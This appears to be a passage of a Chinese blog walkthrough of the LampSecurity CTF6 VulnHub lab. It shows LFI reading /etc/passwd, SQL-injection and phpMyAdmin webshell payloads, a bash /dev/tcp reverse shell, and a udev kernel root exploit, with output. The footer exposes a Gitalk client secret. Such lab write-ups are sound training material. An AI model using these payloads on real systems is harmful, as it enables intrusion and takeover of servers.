<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/LampSecurity/ctf6/workSpace]<br>└─$ curl <span class="hljs-string">&#x27;http://192.168.56.140/actions/login.php?action=../../../../../../../../etc/passwd%00&#x27;</span><br>root:x:0:0:root:/root:/bin/bash<br>bin:x:1:1:bin:/bin:/sbin/nologin<br>daemon:x:2:2:daemon:/sbin:/sbin/nologin<br>adm:x:3:4:adm:/var/adm:/sbin/nologin<br>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:5:0:<span class="hljs-built_in">sync</span>:/sbin:/bin/sync<br>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br>halt:x:7:0:halt:/sbin:/sbin/halt<br>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br>news:x:9:13:news:/etc/news:<br>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin<br>operator:x:11:0:operator:/root:/sbin/nologin<br>games:x:12:100:games:/usr/games:/sbin/nologin<br>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin<br>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br>nobody:x:99:99:Nobody:/:/sbin/nologin<br>rpm:x:37:37::/var/lib/rpm:/sbin/nologin<br>dbus:x:81:81:System message bus:/:/sbin/nologin<br>avahi:x:70:70:Avahi daemon:/:/sbin/nologin<br>mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin<br>smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin<br>distcache:x:94:94:Distcache:/:/sbin/nologin<br>apache:x:48:48:Apache:/var/www:/sbin/nologin<br>nscd:x:28:28:NSCD Daemon:/:/sbin/nologin<br>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin<br>rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin<br>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin<br>nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin<br>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br>squid:x:23:23::/var/spool/squid:/sbin/nologin<br>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash<br>pcap:x:77:77::/var/arpwatch:/sbin/nologin<br>haldaemon:x:68:68:HAL daemon:/:/sbin/nologin<br>dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin<br>john:x:500:500::/home/john:/bin/bash<br>linda:x:501:501::/home/linda:/bin/bash<br>fred:x:502:502::/home/fred:/bin/bash<br>molly:x:503:503::/home/molly:/bin/bash<br>toby:x:504:504::/home/toby:/bin/bash<br></code></pre></td></tr></table></figure>
<p>发现，非常的OK。</p>
<p>所以，按道理，我们和同行一样构造<code>id=4%20UNION%20select%20NULL,NULL,NULL,NULL,NULL,NULL,%27%3C?php%20echo%20system($_POST[\%27cmd\%27]);?%3E%27%20INTO%20OUTFILE%20%27/tmp/008st7845.php%27</code>这样一条语句就可以注入一句话木马然后通过蚁剑连接了。<br>但是，既然都拿到phpmyadmin的管理员权限的账号了，我们不妨研究下怎么通过phpmyadmin向服务器插入webshell。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/sunjikui1255326447/article/details/106440534">上网查了查，主要三种方法能导出webshell</a>：</p>
<ol>
<li>日志法写入<blockquote>
<ul>
<li>Root数据库用户（root权限）</li>
<li>没有写入权限</li>
<li>magic_quotes_gpc：Off（关闭）</li>
</ul>
</blockquote>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> &quot;%genera%&quot;;          <span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询general_log配置以及log保存位置<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span>;              <span class="hljs-operator">/</span><span class="hljs-operator">/</span>开启general log模式<br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">global</span> general_log_file<span class="hljs-operator">=</span><span class="hljs-string">&#x27;D:/phpStudy/WWW/cmd.php&#x27;</span>;    <span class="hljs-operator">/</span><span class="hljs-operator">/</span>设置日志文件保存路径<br><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;              <span class="hljs-operator">/</span><span class="hljs-operator">/</span>phpinfo()写入日志文件，exp写入reverse shell即可。<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;off&#x27;</span>;              <span class="hljs-operator">/</span><span class="hljs-operator">/</span>关闭general_log模式<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 访问设置的日志文件保存路径可以看到php被执行<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>直接插入<blockquote>
<ul>
<li>Root数据库用户（root权限）</li>
<li>网站绝对路径（确定有写入权限）</li>
<li>magic_quotes_gpc：Off（关闭）</li>
</ul>
</blockquote>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php exec(&quot;/bin/bash -c \&#x27;</span>bash <span class="hljs-operator">-</span>i <span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span> <span class="hljs-operator">/</span>dev<span class="hljs-operator">/</span>tcp<span class="hljs-operator">/</span><span class="hljs-operator">&lt;</span>ip<span class="hljs-operator">&gt;</span><span class="hljs-operator">/</span><span class="hljs-operator">&lt;</span>port<span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span><span class="hljs-number">1</span>\<span class="hljs-string">&#x27;&quot;)?&gt;&#x27;</span> <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;/tmp/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure>

<ol start="3">
<li>新建数据库插入<blockquote>
<p>1.Root数据库用户（root权限）<br>2.网站绝对路径（确定有写入权限）<br>3.magic_quotes_gpc：Off（开启）</p>
</blockquote>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">/*创建数据表导出shell*/</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `mysql`.`user1` (`content` TEXT <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> );<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `mysql`.`user1` (`content` ) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;&lt;?php @eval($_POST[x123]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">SELECT</span> `content` <span class="hljs-keyword">FROM</span> `user1` <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;C:\\phpStudy\\WWW\\xxx.php&#x27;</span>;<br><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `user1`;<br></code></pre></td></tr></table></figure>
<p>这台服务器上，general_log功能根本没有，直接第一条skip。<br>第二条试试。发现写入不到网页的各个目录，难怪前一个攻击者是写入<code>/tmp</code>目录下，看了下mysql的<code>tmpdir</code>，果然是<code>/tmp</code>，这玩意是只读的，只能在配置文件里改。我们只能捏着鼻子写进<code>/tmp</code>目录下了。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php exec(&quot;/bin/bash -c \&#x27;</span>bash <span class="hljs-operator">-</span>i <span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span> <span class="hljs-operator">/</span>dev<span class="hljs-operator">/</span>tcp<span class="hljs-operator">/</span><span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.132</span><span class="hljs-operator">/</span><span class="hljs-number">4444</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&amp;</span><span class="hljs-number">1</span>\<span class="hljs-string">&#x27;&quot;)?&gt;&#x27;</span> <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;/tmp/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
<p>然而我们组合技还有一个文件包含，我们直接通过LFI漏洞目录遍历请求我们的shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl 192.168.56.140/actions/login.php?action=../../../../../../../../tmp/shell.php%00  </span><br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvp 4444<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 4444 ...<br>192.168.56.140: inverse host lookup failed: Host name lookup failure<br>connect to [192.168.56.132] from (UNKNOWN) [192.168.56.140] 39860<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>bash-3.2$ <span class="hljs-built_in">whoami</span>    <br>apache<br>bash-3.2$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>    inet6 fe80::20c:29ff:fe5c:7570/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop <br>    <span class="hljs-built_in">link</span>/sit 0.0.0.0 brd 0.0.0.0<br></code></pre></td></tr></table></figure>
<p>成功拿到shell。</p>
<h2 id="Privilge-Escalation"><a href="#Privilge-Escalation" class="headerlink" title="Privilge Escalation"></a>Privilge Escalation</h2><p>上来<code>sudo -l</code>，<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>,<code>crontab</code>都试过了。看了半天也没啥能用的。手动遍历下目录，<code>/home</code>下各用户home目录全是不可读写，想找点凭证没法了。再手动查看了下还是没啥有用的。<br>上<code>linpeas</code>，上来就标红了一条内核版本。但是不是很想走内核提权。先试试别的路径。<br>弄了半天，基本都试过一遍了，没辙了。回头看看内核提权吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh-3.2$ <span class="hljs-built_in">uname</span> -a<br>Linux localhost.localdomain 2.6.18-92.el5 <span class="hljs-comment">#1 SMP Tue Jun 10 18:49:47 EDT 2008 i686 i686 i386 GNU/Linux</span><br></code></pre></td></tr></table></figure>
<p>在exp-db上搜了下Linux Kernal 2.6，从头开始试LPE的exp，试了快8个，都没成功，折磨疯了。<br>上网搜了一下发现<strong>Linux 2.6是有一个著名的内核提权漏洞</strong><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/8478"><strong>UDEV</strong></a>。<br>按他给的步骤先查看udev的pid，然后按网上给的方法先修补一下程序。结果执行多次仍然无法成功提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-3.2$ <span class="hljs-built_in">cat</span> /proc/net/netlink<br>sk       Eth Pid    Groups   Rmem     Wmem     Dump     Locks<br>cfebce00 0   0      00000000 0        0        00000000 2<br>cfc35a00 6   0      00000000 0        0        00000000 2<br>cfe78600 7   0      00000000 0        0        00000000 2<br>c1322200 9   2452   00000000 0        0        00000000 2<br>cfe66e00 9   0      00000000 0        0        00000000 2<br>cf557c00 10  0      00000000 0        0        00000000 2<br>cf518c00 11  0      00000000 0        0        00000000 2<br>cfc35400 15  568    ffffffff 0        0        00000000 2<br>cfebcc00 15  0      00000000 0        0        00000000 2<br>cf518a00 16  0      00000000 0        0        00000000 2<br>cf6c0c00 18  0      00000000 0        0        00000000 2<br>bash-3.2$ sed -i -e <span class="hljs-string">&#x27;s/\r$//&#x27;</span> kernal2.6.sh<br>bash-3.2$ <span class="hljs-built_in">chmod</span> +x kernal2.6.sh<br>bash-3.2$ ./kernal2.6.sh 568<br>suid.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>suid.c:3: warning: incompatible implicit declaration of built-in <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;execl&#x27;</span><br><span class="hljs-built_in">cp</span>: `libno_ex.so.1.0<span class="hljs-string">&#x27; and `/tmp/libno_ex.so.1.0&#x27;</span> are the same file<br></code></pre></td></tr></table></figure>
<p>重试一下，切成sh试试，不知道有没有影响。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">sh-3.2$ ./exp.sh 568<br>./exp.sh 568<br>suid.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>suid.c:3: warning: incompatible implicit declaration of built-in <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;execl&#x27;</span><br><span class="hljs-built_in">cp</span>: `libno_ex.so.1.0<span class="hljs-string">&#x27; and `/tmp/libno_ex.so.1.0&#x27;</span> are the same file<br>sh-3.2$ ./exp.sh 568<br>./exp.sh 568<br>suid.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>suid.c:3: warning: incompatible implicit declaration of built-in <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;execl&#x27;</span><br><span class="hljs-built_in">cp</span>: `libno_ex.so.1.0<span class="hljs-string">&#x27; and `/tmp/libno_ex.so.1.0&#x27;</span> are the same file<br>sh-3.2$ ./exp.sh 568<br>./exp.sh 568<br>suid.c: In <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;main&#x27;</span>:<br>suid.c:3: warning: incompatible implicit declaration of built-in <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;execl&#x27;</span><br><span class="hljs-built_in">cp</span>: `libno_ex.so.1.0<span class="hljs-string">&#x27; and `/tmp/libno_ex.so.1.0&#x27;</span> are the same file<br>sh-3.2<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>sh-3.2<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:0c:29:5c:75:70 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>    inet6 fe80::20c:29ff:fe5c:7570/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: sit0: &lt;NOARP&gt; mtu 1480 qdisc noop <br>    <span class="hljs-built_in">link</span>/sit 0.0.0.0 brd 0.0.0.0<br>sh-3.2<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
<p>多试了几次之后成功提权了。<br>我的评价是内核提权是这样的，非常不稳定。主要这台靶机没有啥别的提权思路了，只能内核提权尝试了。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/SickOS1.2/">← Next [vulnhub]  SickOS1.2</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/24/kenobi/">[THM]  kenobi Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">1.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#manual-web-discoverd"><span class="toc-number">1.3.</span> <span class="toc-text">manual web discoverd</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilge-Escalation"><span class="toc-number">3.</span> <span class="toc-text">Privilge Escalation</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>